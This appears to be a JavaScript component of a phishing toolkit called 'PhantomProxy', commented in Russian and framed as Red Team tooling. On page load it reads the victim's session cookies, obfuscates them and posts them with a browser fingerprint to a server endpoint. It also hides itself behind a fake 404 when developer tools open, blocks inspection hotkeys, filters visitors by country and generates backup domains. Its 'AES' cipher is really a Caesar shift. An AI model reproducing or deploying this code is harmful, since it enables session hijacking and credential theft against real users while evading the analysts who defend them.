/**
 * PhantomProxy v5.0 PRO - Advanced Obfuscation & Anti-Debug
 * Для профессиональных Red Team операций
 */

// === AES ШИФРОВАНИЕ ДАННЫХ ===
class AESCipher {
    constructor(key) {
        this.key = key || this.generateKey();
    }
    
    generateKey() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let key = '';
        for (let i = 0; i < 32; i++) {
            key += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return key;
    }
    
    // Шифрование Цезарем + Unicode символы
    obfuscate(data) {
        let encrypted = '';
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            // Шифр Цезаря (сдвиг на 3)
            const shifted = char + 3;
            // Добавляем невидимый Unicode символ
            const invisible = String.fromCharCode(0x3164);
            encrypted += String.fromCharCode(shifted) + invisible;
        }
        return btoa(encrypted);
    }
    
    // Дешифрование
    deobfuscate(data) {
        let decoded = atob(data);
        let result = '';
        // Удаляем невидимые символы и расшифровываем
        for (let i = 0; i < decoded.length; i += 2) {
            const char = decoded.charCodeAt(i);
            result += String.fromCharCode(char - 3);
        }
        return result;
    }
}

// === ANTI-DEBUG ЗАЩИТА ===
class AntiDebug {
    constructor() {
        this.devtools = false;
        this.init();
    }
    
    init() {
        // Детект F12 / DevTools
        this.detectDevTools();
        
        // Детект отладчика
        this.debuggerTrap();
        
        // Блокировка горячих клавиш
        this.blockHotkeys();
    }
    
    detectDevTools() {
        const threshold = 160;
        
        const check = () => {
            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
            
            if (widthThreshold || heightThreshold) {
                this.onDevToolsDetected();
            }
        };
        
        setInterval(check, 1000);
    }
    
    debuggerTrap() {
        const trap = () => {
            const start = new Date();
            debugger;
            const end = new Date();
            
            if (end - start > 100) {
                this.onDevToolsDetected();
            }
        };
        
        setInterval(trap, 1000);
    }
    
    blockHotkeys() {
        document.addEventListener('keydown', (e) => {
            // F12
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            
            // Ctrl+Shift+I (DevTools)
            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                e.preventDefault();
                return false;
            }
            
            // Ctrl+Shift+J (Console)
            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
                e.preventDefault();
                return false;
            }
            
            // Ctrl+U (View Source)
            if (e.ctrlKey && e.key === 'U') {
                e.preventDefault();
                return false;
            }
        });
    }
    
    onDevToolsDetected() {
        // Показываем "пустышку"
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;"><h1>404 - Page Not Found</h1></div>';
        
        // Блокируем ввод
        document.querySelectorAll('input').forEach(input => {
            input.disabled = true;
        });
        
        console.warn('DevTools detected - Protection activated');
    }
}

// === BROWSER FINGERPRINTING ===
class BrowserFingerprint {
    constructor() {
        this.fingerprint = null;
        this.collect();
    }
    
    collect() {
        this.fingerprint = {
            // Браузер
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            
            // Экран
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            
            // Время
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            
            // Аппаратное
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            
            // Canvas fingerprint
            canvas: this.getCanvasFingerprint(),
            
            // WebGL
            webgl: this.getWebGLFingerprint(),
            
            // Шрифты
            fonts: this.getFontsFingerprint(),
            
            // Cookies
            cookiesEnabled: navigator.cookieEnabled,
            
            // Do Not Track
            doNotTrack: navigator.doNotTrack,
        };
        
        return this.fingerprint;
    }
    
    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('PhantomProxy Fingerprint', 2, 2);
        return canvas.toDataURL().slice(0, 100);
    }
    
    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
            };
        } catch (e) {
            return null;
        }
    }
    
    getFontsFingerprint() {
        const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
        const testString = 'mmmmmmmmmmlli';
        const baseWidth = 100;
        const detected = [];
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        fonts.forEach(font => {
            ctx.font = `${baseWidth}px "${font}", sans-serif`;
            const metrics = ctx.measureText(testString);
            if (metrics.width !== baseWidth) {
                detected.push(font);
            }
        });
        
        return detected;
    }
    
    // Генерация уникального ID
    generateId() {
        const hash = JSON.stringify(this.fingerprint);
        let h = 0;
        for (let i = 0; i < hash.length; i++) {
            h = Math.imul(31, h) + hash.charCodeAt(i) | 0;
        }
        return Math.abs(h).toString(36);
    }
    
    // Проверка на бота/аналитика
    isSuspicious() {
        const fp = this.fingerprint;
        
        // Подозрительно если:
        // - Нет timezone
        // - Do Not Track включен
        // - Canvas/WebGL не доступен
        // - Нестандартное разрешение
        
        if (!fp.timezone || fp.doNotTrack === '1') {
            return true;
        }
        
        if (!fp.canvas || !fp.webgl) {
            return true;
        }
        
        return false;
    }
}

// === GEO-TARGETING ===
class GeoTargeting {
    constructor() {
        this.allowedCountries = [];
        this.userCountry = null;
    }
    
    async detectCountry() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            this.userCountry = data.country_code;
            return this.userCountry;
        } catch (e) {
            return null;
        }
    }
    
    setAllowedCountries(countries) {
        this.allowedCountries = countries;
    }
    
    isAllowed() {
        if (this.allowedCountries.length === 0) {
            return true; // Все разрешены
        }
        return this.allowedCountries.includes(this.userCountry);
    }
    
    // Если не из нужной страны - редирект
    enforce() {
        if (!this.isAllowed()) {
            window.location.href = 'https://www.google.com';
            return false;
        }
        return true;
    }
}

// === DGA (Domain Generation Algorithm) ===
class DGA {
    constructor(seed) {
        this.seed = seed || Date.now();
    }
    
    generate(count = 10) {
        const domains = [];
        const tlds = ['.com', '.net', '.org', '.io', '.co'];
        
        for (let i = 0; i < count; i++) {
            const name = this.generateDomainName();
            const tld = tlds[Math.floor(Math.random() * tlds.length)];
            domains.push(name + tld);
        }
        
        return domains;
    }
    
    generateDomainName() {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let name = '';
        const length = Math.floor(Math.random() * 8) + 6; // 6-14 символов
        
        for (let i = 0; i < length; i++) {
            name += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        
        return name;
    }
}

// === SESSION COOKIE HANDLER ===
class SessionCookieHandler {
    constructor() {
        this.cipher = new AESCipher();
    }
    
    // Сбор и шифрование cookies
    collectAndEncrypt() {
        const cookies = document.cookie;
        return this.cipher.obfuscate(cookies);
    }
    
    // Отправка на сервер
    async sendToServer(endpoint) {
        const encrypted = this.collectAndEncrypt();
        
        try {
            await fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    cookies: encrypted,
                    fingerprint: new BrowserFingerprint().generateId(),
                    timestamp: Date.now()
                })
            });
        } catch (e) {
            console.error('Failed to send cookies');
        }
    }
    
    // Автоматический импорт cookies (для Red Team)
    async importCookies(cookiesData) {
        const cookies = this.cipher.deobfuscate(cookiesData);
        cookies.split(';').forEach(cookie => {
            document.cookie = cookie;
        });
    }
}

// === ИНИЦИАЛИЗАЦИЯ ===
(function() {
    // Anti-Debug
    const antiDebug = new AntiDebug();
    
    // Fingerprinting
    const fingerprint = new BrowserFingerprint();
    
    // Geo-Targeting (пример для РФ)
    const geo = new GeoTargeting();
    geo.setAllowedCountries(['RU', 'BY', 'KZ']);
    geo.detectCountry().then(() => {
        if (!geo.isAllowed()) {
            console.log('User not from allowed country');
        }
    });
    
    // DGA для резервных доменов
    const dga = new DGA();
    const backupDomains = dga.generate(5);
    console.log('Backup domains:', backupDomains);
    
    // Auto-send cookies при загрузке
    const cookieHandler = new SessionCookieHandler();
    window.addEventListener('load', () => {
        setTimeout(() => {
            cookieHandler.sendToServer('/api/v1/cookies');
        }, 2000);
    });
})();
